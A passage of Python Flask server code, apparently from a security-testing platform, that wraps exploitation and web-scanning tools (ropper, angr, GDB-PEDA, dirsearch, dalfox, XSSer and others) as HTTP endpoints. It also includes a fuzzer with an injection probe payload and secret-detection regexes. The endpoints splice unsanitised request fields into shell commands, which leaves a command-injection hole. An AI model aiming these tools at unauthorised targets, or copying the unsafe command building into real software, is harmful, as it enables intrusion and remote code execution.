    """Execute libc-database for libc identification and offset lookup"""
    try:
        params = request.json
        action = params.get("action", "find")  # find, dump, download
        symbols = params.get("symbols", "")  # format: "symbol1:offset1 symbol2:offset2"
        libc_id = params.get("libc_id", "")
        additional_args = params.get("additional_args", "")

        if action == "find" and not symbols:
            logger.warning("🔧 libc-database find called without symbols")
            return jsonify({"error": "Symbols parameter is required for find action"}), 400

        if action in ["dump", "download"] and not libc_id:
            logger.warning("🔧 libc-database called without libc_id for dump/download")
            return jsonify({"error": "libc_id parameter is required for dump/download actions"}), 400

        # Navigate to libc-database directory (assuming it's installed)
        base_command = "cd /opt/libc-database 2>/dev/null || cd ~/libc-database 2>/dev/null || echo 'libc-database not found'"

        if action == "find":
            command = f"{base_command} && ./find {symbols}"
        elif action == "dump":
            command = f"{base_command} && ./dump {libc_id}"
        elif action == "download":
            command = f"{base_command} && ./download {libc_id}"
        else:
            return jsonify({"error": f"Invalid action: {action}"}), 400

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting libc-database {action}: {symbols or libc_id}")
        result = execute_command(command)
        logger.info(f"📊 libc-database {action} completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in libc-database endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/gdb-peda", methods=["POST"])
def gdb_peda():
    """Execute GDB with PEDA for enhanced debugging and exploitation"""
    try:
        params = request.json
        binary = params.get("binary", "")
        commands = params.get("commands", "")
        attach_pid = params.get("attach_pid", 0)
        core_file = params.get("core_file", "")
        additional_args = params.get("additional_args", "")

        if not binary and not attach_pid and not core_file:
            logger.warning("🔧 GDB-PEDA called without binary, PID, or core file")
            return jsonify({"error": "Binary, PID, or core file parameter is required"}), 400

        # Base GDB command with PEDA
        command = "gdb -q"

        if binary:
            command += f" {binary}"

        if core_file:
            command += f" {core_file}"

        if attach_pid:
            command += f" -p {attach_pid}"

        # Create command script
        if commands:
            temp_script = "/tmp/gdb_peda_commands.txt"
            peda_commands = f"""
source ~/peda/peda.py
{commands}
quit
"""
            with open(temp_script, "w") as f:
                f.write(peda_commands)
            command += f" -x {temp_script}"
        else:
            # Default PEDA initialization
            command += " -ex 'source ~/peda/peda.py' -ex 'quit'"

        if additional_args:
            command += f" {additional_args}"

        target_info = binary or f'PID {attach_pid}' or core_file
        logger.info(f"🔧 Starting GDB-PEDA analysis: {target_info}")
        result = execute_command(command)

        # Cleanup
        if commands and os.path.exists("/tmp/gdb_peda_commands.txt"):
            try:
                os.remove("/tmp/gdb_peda_commands.txt")
            except:
                pass

        logger.info(f"📊 GDB-PEDA analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in gdb-peda endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/angr", methods=["POST"])
def angr():
    """Execute angr for symbolic execution and binary analysis"""
    try:
        params = request.json
        binary = params.get("binary", "")
        script_content = params.get("script_content", "")
        find_address = params.get("find_address", "")
        avoid_addresses = params.get("avoid_addresses", "")
        analysis_type = params.get("analysis_type", "symbolic")  # symbolic, cfg, static
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 angr called without binary parameter")
            return jsonify({"error": "Binary parameter is required"}), 400

        # Create angr script
        script_file = "/tmp/angr_analysis.py"

        if script_content:
            with open(script_file, "w") as f:
                f.write(script_content)
        else:
            # Generate basic angr template
            template = f"""#!/usr/bin/env python3
import angr
import sys

# Load binary
project = angr.Project('{binary}', auto_load_libs=False)
print(f"Loaded binary: {binary}")
print(f"Architecture: {{project.arch}}")
print(f"Entry point: {{hex(project.entry)}}")

"""
            if analysis_type == "symbolic":
                template += f"""
# Symbolic execution
state = project.factory.entry_state()
simgr = project.factory.simulation_manager(state)

# Find and avoid addresses
find_addr = {find_address if find_address else 'None'}
avoid_addrs = {avoid_addresses.split(',') if avoid_addresses else '[]'}

if find_addr:
    simgr.explore(find=find_addr, avoid=avoid_addrs)
    if simgr.found:
        print("Found solution!")
        solution_state = simgr.found[0]
        print(f"Input: {{solution_state.posix.dumps(0)}}")
    else:
        print("No solution found")
else:
    print("No find address specified, running basic analysis")
"""
            elif analysis_type == "cfg":
                template += """
# Control Flow Graph analysis
cfg = project.analyses.CFGFast()
print(f"CFG nodes: {len(cfg.graph.nodes())}")
print(f"CFG edges: {len(cfg.graph.edges())}")

# Function analysis
for func_addr, func in cfg.functions.items():
    print(f"Function: {func.name} at {hex(func_addr)}")
"""

            with open(script_file, "w") as f:
                f.write(template)

        command = f"python3 {script_file}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting angr analysis: {binary}")
        result = execute_command(command, timeout=600)  # Longer timeout for symbolic execution

        # Cleanup
        try:
            os.remove(script_file)
        except:
            pass

        logger.info(f"📊 angr analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in angr endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/ropper", methods=["POST"])
def ropper():
    """Execute ropper for advanced ROP/JOP gadget searching"""
    try:
        params = request.json
        binary = params.get("binary", "")
        gadget_type = params.get("gadget_type", "rop")  # rop, jop, sys, all
        quality = params.get("quality", 1)  # 1-5, higher = better quality
        arch = params.get("arch", "")  # x86, x86_64, arm, etc.
        search_string = params.get("search_string", "")
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 ropper called without binary parameter")
            return jsonify({"error": "Binary parameter is required"}), 400

        command = f"ropper --file {binary}"

        if gadget_type == "rop":
            command += " --rop"
        elif gadget_type == "jop":
            command += " --jop"
        elif gadget_type == "sys":
            command += " --sys"
        elif gadget_type == "all":
            command += " --all"

        if quality > 1:
            command += f" --quality {quality}"

        if arch:
            command += f" --arch {arch}"

        if search_string:
            command += f" --search '{search_string}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting ropper analysis: {binary}")
        result = execute_command(command)
        logger.info(f"📊 ropper analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in ropper endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/pwninit", methods=["POST"])
def pwninit():
    """Execute pwninit for CTF binary exploitation setup"""
    try:
        params = request.json
        binary = params.get("binary", "")
        libc = params.get("libc", "")
        ld = params.get("ld", "")
        template_type = params.get("template_type", "python")  # python, c
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 pwninit called without binary parameter")
            return jsonify({"error": "Binary parameter is required"}), 400

        command = f"pwninit --bin {binary}"

        if libc:
            command += f" --libc {libc}"

        if ld:
            command += f" --ld {ld}"

        if template_type:
            command += f" --template {template_type}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting pwninit setup: {binary}")
        result = execute_command(command)
        logger.info(f"📊 pwninit setup completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in pwninit endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# ADDITIONAL WEB SECURITY TOOLS
# ============================================================================

@app.route("/api/tools/feroxbuster", methods=["POST"])
def feroxbuster():
    """Execute Feroxbuster for recursive content discovery with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", COMMON_DIRB_PATH)
        threads = params.get("threads", 10)
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 Feroxbuster called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        command = f"feroxbuster -u {url} -w {wordlist} -t {threads}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Feroxbuster scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 Feroxbuster scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in feroxbuster endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/dotdotpwn", methods=["POST"])
def dotdotpwn():
    """Execute DotDotPwn for directory traversal testing with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        module = params.get("module", "http")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 DotDotPwn called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"dotdotpwn -m {module} -h {target}"

        if additional_args:
            command += f" {additional_args}"

        command += " -b"

        logger.info(f"🔍 Starting DotDotPwn scan: {target}")
        result = execute_command(command)
        logger.info(f"📊 DotDotPwn scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in dotdotpwn endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/xsser", methods=["POST"])
def xsser():
    """Execute XSSer for XSS vulnerability testing with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        params_str = params.get("params", "")
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 XSSer called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        command = f"xsser --url '{url}'"

        if params_str:
            command += f" --param='{params_str}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting XSSer scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 XSSer scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in xsser endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/wfuzz", methods=["POST"])
def wfuzz():
    """Execute Wfuzz for web application fuzzing with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", COMMON_DIRB_PATH)
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 Wfuzz called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        command = f"wfuzz -w {wordlist} '{url}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Wfuzz scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 Wfuzz scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in wfuzz endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ENHANCED WEB APPLICATION SECURITY TOOLS (v6.0)
# ============================================================================

@app.route("/api/tools/dirsearch", methods=["POST"])
def dirsearch():
    """Execute Dirsearch for advanced directory and file discovery with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        extensions = params.get("extensions", "php,html,js,txt,xml,json")
        wordlist = params.get("wordlist", COMMON_DIRSEARCH_PATH)
        threads = params.get("threads", 30)
        recursive = params.get("recursive", False)
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 Dirsearch called without URL parameter")
            return jsonify({"error": "URL parameter is required"}), 400

        command = f"dirsearch -u {url} -e {extensions} -w {wordlist} -t {threads}"

        if recursive:
            command += " -r"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"📁 Starting Dirsearch scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 Dirsearch scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in dirsearch endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/katana", methods=["POST"])
def katana():
    """Execute Katana for next-generation crawling and spidering with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        depth = params.get("depth", 3)
        js_crawl = params.get("js_crawl", True)
        form_extraction = params.get("form_extraction", True)
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 Katana called without URL parameter")
            return jsonify({"error": "URL parameter is required"}), 400

        command = f"katana -u {url} -d {depth}"

        if js_crawl:
            command += " -jc"

        if form_extraction:
            command += " -fx"

        if output_format == "json":
            command += " -jsonl"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"⚔️  Starting Katana crawl: {url}")
        result = execute_command(command)
        logger.info(f"📊 Katana crawl completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in katana endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/gau", methods=["POST"])
def gau():
    """Execute Gau (Get All URLs) for URL discovery from multiple sources with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        providers = params.get("providers", "wayback,commoncrawl,otx,urlscan")
        include_subs = params.get("include_subs", True)
        blacklist = params.get("blacklist", "png,jpg,gif,jpeg,swf,woff,svg,pdf,css,ico")
        additional_args = params.get("additional_args", "")

        if not domain:
            logger.warning("🌐 Gau called without domain parameter")
            return jsonify({"error": "Domain parameter is required"}), 400

        command = f"gau {domain}"

        if providers != "wayback,commoncrawl,otx,urlscan":
            command += f" --providers {providers}"

        if include_subs:
            command += " --subs"

        if blacklist:
            command += f" --blacklist {blacklist}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"📡 Starting Gau URL discovery: {domain}")
        result = execute_command(command)
        logger.info(f"📊 Gau URL discovery completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in gau endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/waybackurls", methods=["POST"])
def waybackurls():
    """Execute Waybackurls for historical URL discovery with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        get_versions = params.get("get_versions", False)
        no_subs = params.get("no_subs", False)
        additional_args = params.get("additional_args", "")

        if not domain:
            logger.warning("🌐 Waybackurls called without domain parameter")
            return jsonify({"error": "Domain parameter is required"}), 400

        command = f"waybackurls {domain}"

        if get_versions:
            command += " --get-versions"

        if no_subs:
            command += " --no-subs"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🕰️  Starting Waybackurls discovery: {domain}")
        result = execute_command(command)
        logger.info(f"📊 Waybackurls discovery completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in waybackurls endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/arjun", methods=["POST"])
def arjun():
    """Execute Arjun for HTTP parameter discovery with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        method = params.get("method", "GET")
        wordlist = params.get("wordlist", "")
        delay = params.get("delay", 0)
        threads = params.get("threads", 25)
        stable = params.get("stable", False)
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 Arjun called without URL parameter")
            return jsonify({"error": "URL parameter is required"}), 400

        command = f"arjun -u {url} -m {method} -t {threads}"

        if wordlist:
            command += f" -w {wordlist}"

        if delay > 0:
            command += f" -d {delay}"

        if stable:
            command += " --stable"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🎯 Starting Arjun parameter discovery: {url}")
        result = execute_command(command)
        logger.info(f"📊 Arjun parameter discovery completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in arjun endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/paramspider", methods=["POST"])
def paramspider():
    """Execute ParamSpider for parameter mining from web archives with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        level = params.get("level", 2)
        exclude = params.get("exclude", "png,jpg,gif,jpeg,swf,woff,svg,pdf,css,ico")
        output = params.get("output", "")
        additional_args = params.get("additional_args", "")

        if not domain:
            logger.warning("🌐 ParamSpider called without domain parameter")
            return jsonify({"error": "Domain parameter is required"}), 400

        command = f"paramspider -d {domain} -l {level}"

        if exclude:
            command += f" --exclude {exclude}"

        if output:
            command += f" -o {output}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🕷️  Starting ParamSpider mining: {domain}")
        result = execute_command(command)
        logger.info(f"📊 ParamSpider mining completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in paramspider endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/x8", methods=["POST"])
def x8():
    """Execute x8 for hidden parameter discovery with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/x8/params.txt")
        method = params.get("method", "GET")
        body = params.get("body", "")
        headers = params.get("headers", "")
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 x8 called without URL parameter")
            return jsonify({"error": "URL parameter is required"}), 400

        command = f"x8 -u {url} -w {wordlist} -X {method}"

        if body:
            command += f" -b '{body}'"

        if headers:
            command += f" -H '{headers}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting x8 parameter discovery: {url}")
        result = execute_command(command)
        logger.info(f"📊 x8 parameter discovery completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in x8 endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/jaeles", methods=["POST"])
def jaeles():
    """Execute Jaeles for advanced vulnerability scanning with custom signatures"""
    try:
        params = request.json
        url = params.get("url", "")
        signatures = params.get("signatures", "")
        config = params.get("config", "")
        threads = params.get("threads", 20)
        timeout = params.get("timeout", 20)
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 Jaeles called without URL parameter")
            return jsonify({"error": "URL parameter is required"}), 400

        command = f"jaeles scan -u {url} -c {threads} --timeout {timeout}"

        if signatures:
            command += f" -s {signatures}"

        if config:
            command += f" --config {config}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔬 Starting Jaeles vulnerability scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 Jaeles vulnerability scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in jaeles endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/dalfox", methods=["POST"])
def dalfox():
    """Execute Dalfox for advanced XSS vulnerability scanning with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        pipe_mode = params.get("pipe_mode", False)
        blind = params.get("blind", False)
        mining_dom = params.get("mining_dom", True)
        mining_dict = params.get("mining_dict", True)
        custom_payload = params.get("custom_payload", "")
        additional_args = params.get("additional_args", "")

        if not url and not pipe_mode:
            logger.warning("🌐 Dalfox called without URL parameter")
            return jsonify({"error": "URL parameter is required"}), 400

        if pipe_mode:
            command = "dalfox pipe"
        else:
            command = f"dalfox url {url}"

        if blind:
            command += " --blind"

        if mining_dom:
            command += " --mining-dom"

        if mining_dict:
            command += " --mining-dict"

        if custom_payload:
            command += f" --custom-payload '{custom_payload}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🎯 Starting Dalfox XSS scan: {url if url else 'pipe mode'}")
        result = execute_command(command)
        logger.info(f"📊 Dalfox XSS scan completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in dalfox endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/httpx", methods=["POST"])
def httpx():
    """Execute httpx for fast HTTP probing and technology detection"""
    try:
        params = request.json
        target = params.get("target", "")
        probe = params.get("probe", True)
        tech_detect = params.get("tech_detect", False)
        status_code = params.get("status_code", False)
        content_length = params.get("content_length", False)
        title = params.get("title", False)
        web_server = params.get("web_server", False)
        threads = params.get("threads", 50)
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🌐 httpx called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"httpx -u {target} -t {threads}"

        if probe:
            command += " -probe"

        if tech_detect:
            command += " -tech-detect"

        if status_code:
            command += " -sc"

        if content_length:
            command += " -cl"

        if title:
            command += " -title"

        if web_server:
            command += " -server"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🌍 Starting httpx probe: {target}")
        result = execute_command(command)
        logger.info(f"📊 httpx probe completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in httpx endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/anew", methods=["POST"])
def anew():
    """Execute anew for appending new lines to files (useful for data processing)"""
    try:
        params = request.json
        input_data = params.get("input_data", "")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")

        if not input_data:
            logger.warning("📝 Anew called without input data")
            return jsonify({"error": "Input data is required"}), 400

        if output_file:
            command = f"echo '{input_data}' | anew {output_file}"
        else:
            command = f"echo '{input_data}' | anew"

        if additional_args:
            command += f" {additional_args}"

        logger.info("📝 Starting anew data processing")
        result = execute_command(command)
        logger.info("📊 anew data processing completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in anew endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/qsreplace", methods=["POST"])
def qsreplace():
    """Execute qsreplace for query string parameter replacement"""
    try:
        params = request.json
        urls = params.get("urls", "")
        replacement = params.get("replacement", "FUZZ")
        additional_args = params.get("additional_args", "")

        if not urls:
            logger.warning("🌐 qsreplace called without URLs")
            return jsonify({"error": "URLs parameter is required"}), 400

        command = f"echo '{urls}' | qsreplace '{replacement}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info("🔄 Starting qsreplace parameter replacement")
        result = execute_command(command)
        logger.info("📊 qsreplace parameter replacement completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in qsreplace endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/uro", methods=["POST"])
def uro():
    """Execute uro for filtering out similar URLs"""
    try:
        params = request.json
        urls = params.get("urls", "")
        whitelist = params.get("whitelist", "")
        blacklist = params.get("blacklist", "")
        additional_args = params.get("additional_args", "")

        if not urls:
            logger.warning("🌐 uro called without URLs")
            return jsonify({"error": "URLs parameter is required"}), 400

        command = f"echo '{urls}' | uro"

        if whitelist:
            command += f" --whitelist {whitelist}"

        if blacklist:
            command += f" --blacklist {blacklist}"

        if additional_args:
            command += f" {additional_args}"

        logger.info("🔍 Starting uro URL filtering")
        result = execute_command(command)
        logger.info("📊 uro URL filtering completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in uro endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# ADVANCED WEB SECURITY TOOLS CONTINUED
# ============================================================================

# ============================================================================
# ENHANCED HTTP TESTING FRAMEWORK (BURP SUITE ALTERNATIVE)
# ============================================================================

class HTTPTestingFramework:
    """Advanced HTTP testing framework as Burp Suite alternative"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'HexStrike-HTTP-Framework/1.0 (Advanced Security Testing)'
        })
        self.proxy_history = []
        self.vulnerabilities = []
        self.match_replace_rules = []  # [{'where':'query|headers|body|url','pattern':'regex','replacement':'str'}]
        self.scope = None  # {'host': 'example.com', 'include_subdomains': True}
        self._req_id = 0

    def setup_proxy(self, proxy_port: int = 8080):
        """Setup HTTP proxy for request interception"""
        self.session.proxies = {
            'http': f'http://127.0.0.1:{proxy_port}',
            'https': f'http://127.0.0.1:{proxy_port}'
        }

    def intercept_request(self, url: str, method: str = 'GET', data: Any = None,
                         headers: Optional[Dict[str, Any]] = None, cookies: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Intercept and analyze HTTP requests"""
        try:
            if headers:
                self.session.headers.update(headers)
            if cookies:
                self.session.cookies.update(cookies)

            # Apply match/replace rules prior to sending
            url, data, send_headers = self._apply_match_replace(url, data, dict(self.session.headers))
            if headers:
                send_headers.update(headers)

            if method.upper() == 'GET':
                response = self.session.get(url, params=data, headers=send_headers, timeout=30)
            elif method.upper() == 'POST':
                response = self.session.post(url, data=data, headers=send_headers, timeout=30)
            elif method.upper() == 'PUT':
                response = self.session.put(url, data=data, headers=send_headers, timeout=30)
            elif method.upper() == 'DELETE':
                response = self.session.delete(url, headers=send_headers, timeout=30)
            else:
                response = self.session.request(method, url, data=data, headers=send_headers, timeout=30)

            # Store request/response in history
            self._req_id += 1
            request_data = {
                'id': self._req_id,
                'url': url,
                'method': method,
                'headers': dict(response.request.headers),
                'data': data,
                'timestamp': datetime.now().isoformat()
            }

            response_data = {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content': response.text[:10000],  # Limit content size
                'size': len(response.content),
                'time': response.elapsed.total_seconds()
            }

            self.proxy_history.append({
                'request': request_data,
                'response': response_data
            })

            # Analyze for vulnerabilities
            self._analyze_response_for_vulns(url, response)

            return {
                'success': True,
                'request': request_data,
                'response': response_data,
                'vulnerabilities': self._get_recent_vulns()
            }

        except Exception as e:
            logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'HTTP-Framework', str(e))}")
            return {'success': False, 'error': str(e)}

    # ----------------- Match & Replace and Scope -----------------
    def set_match_replace_rules(self, rules: list):
        """Set match/replace rules. Each rule: {'where','pattern','replacement'}"""
        self.match_replace_rules = rules or []

    def set_scope(self, host: str, include_subdomains: bool = True):
        self.scope = {'host': host, 'include_subdomains': include_subdomains}

    def _in_scope(self, url: str) -> bool:
        if not self.scope:
            return True
        try:
            h = urlparse(url).hostname or ''
            target = self.scope.get('host','')
            if not h or not target:
                return True
            if h == target:
                return True
            if self.scope.get('include_subdomains') and h.endswith('.'+target):
                return True
        except Exception:
            return True
        return False

    def _apply_match_replace(self, url: str, data, headers: dict):
        from urllib.parse import parse_qsl, urlencode, urlunparse
        original_url = url
        out_headers = dict(headers)
        out_data = data
        for rule in self.match_replace_rules:
            where = (rule.get('where') or 'url').lower()
            pattern = rule.get('pattern') or ''
            repl = rule.get('replacement') or ''
            try:
                if where == 'url':
                    url = re.sub(pattern, repl, url)
                elif where == 'query':
                    pr = urlparse(url)
                    qs = parse_qsl(pr.query, keep_blank_values=True)
                    new_qs = []
                    for k, v in qs:
                        nk = re.sub(pattern, repl, k)
                        nv = re.sub(pattern, repl, v)
                        new_qs.append((nk, nv))
                    url = urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, urlencode(new_qs), pr.fragment))
                elif where == 'headers':
                    out_headers = {re.sub(pattern, repl, k): re.sub(pattern, repl, str(v)) for k, v in out_headers.items()}
                elif where == 'body':
                    if isinstance(out_data, dict):
                        out_data = {re.sub(pattern, repl, k): re.sub(pattern, repl, str(v)) for k, v in out_data.items()}
                    elif isinstance(out_data, str):
                        out_data = re.sub(pattern, repl, out_data)
            except Exception:
                continue
        # Ensure scope restriction
        if not self._in_scope(url):
            logger.warning(f"{ModernVisualEngine.format_tool_status('HTTP-Framework', 'SKIPPED', f'Out of scope: {url}')}" )
            return original_url, data, headers
        return url, out_data, out_headers

    # ----------------- Repeater (custom send) -----------------
    def send_custom_request(self, request_spec: dict) -> dict:
        """Send a custom request with explicit fields, applying rules."""
        url = request_spec.get('url','')
        method = request_spec.get('method','GET')
        headers = request_spec.get('headers') or {}
        cookies = request_spec.get('cookies') or {}
        data = request_spec.get('data')
        return self.intercept_request(url, method, data, headers, cookies)

    # ----------------- Intruder (Sniper mode) -----------------
    def intruder_sniper(self, url: str, method: str = 'GET', location: str = 'query',
                        params: Optional[list] = None, payloads: Optional[list] = None, base_data: Optional[dict] = None,
                        max_requests: int = 100) -> dict:
        """Simple fuzzing: iterate payloads over each parameter individually (Sniper)."""
        from urllib.parse import parse_qsl, urlencode, urlunparse
        params = params or []
        payloads = payloads or ["'\"<>`, ${7*7}"]
        base_data = base_data or {}
        interesting = []
        total = 0
        baseline = self.intercept_request(url, method, base_data)
        base_status = baseline.get('response',{}).get('status_code') if baseline.get('success') else None
        base_len = baseline.get('response',{}).get('size') if baseline.get('success') else None
        for p in params:
            for pay in payloads:
                if total >= max_requests:
                    break
                m_url = url
                m_data = dict(base_data)
                m_headers = {}
                if location == 'query':
                    pr = urlparse(url)
                    q = dict(parse_qsl(pr.query, keep_blank_values=True))
                    q[p] = pay
                    m_url = urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, urlencode(q), pr.fragment))
                elif location == 'body':
                    m_data[p] = pay
                elif location == 'headers':
                    m_headers[p] = pay
                elif location == 'cookie':
                    self.session.cookies.set(p, pay)
                resp = self.intercept_request(m_url, method, m_data, m_headers)
                total += 1
                if not resp.get('success'):
                    continue
                r = resp['response']
                changed = (base_status is not None and r.get('status_code') != base_status) or (base_len is not None and abs(r.get('size',0) - base_len) > 150)
                reflected = pay in (r.get('content') or '')
                if changed or reflected:
                    interesting.append({
                        'param': p,
                        'payload': pay,
                        'status_code': r.get('status_code'),
                        'size': r.get('size'),
                        'reflected': reflected
                    })
        return {
            'success': True,
            'tested': total,
            'interesting': interesting[:50]
        }

    def _analyze_response_for_vulns(self, url: str, response):
        """Analyze HTTP response for common vulnerabilities"""
        vulns = []

        # Check for missing security headers
        security_headers = {
            'X-Frame-Options': 'Clickjacking protection missing',
            'X-Content-Type-Options': 'MIME type sniffing protection missing',
            'X-XSS-Protection': 'XSS protection missing',
            'Strict-Transport-Security': 'HTTPS enforcement missing',
            'Content-Security-Policy': 'Content Security Policy missing'
        }

        for header, description in security_headers.items():
            if header not in response.headers:
                vulns.append({
                    'type': 'missing_security_header',
                    'severity': 'medium',
                    'description': description,
                    'url': url,
                    'header': header
                })

        # Check for sensitive information disclosure
        sensitive_patterns = [
            (r'password\s*[:=]\s*["\']?([^"\'\s]+)', 'Password disclosure'),
            (r'api[_-]?key\s*[:=]\s*["\']?([^"\'\s]+)', 'API key disclosure'),
            (r'secret\s*[:=]\s*["\']?([^"\'\s]+)', 'Secret disclosure'),
            (r'token\s*[:=]\s*["\']?([^"\'\s]+)', 'Token disclosure')
        ]

        for pattern, description in sensitive_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                vulns.append({
                    'type': 'information_disclosure',
                    'severity': 'high',
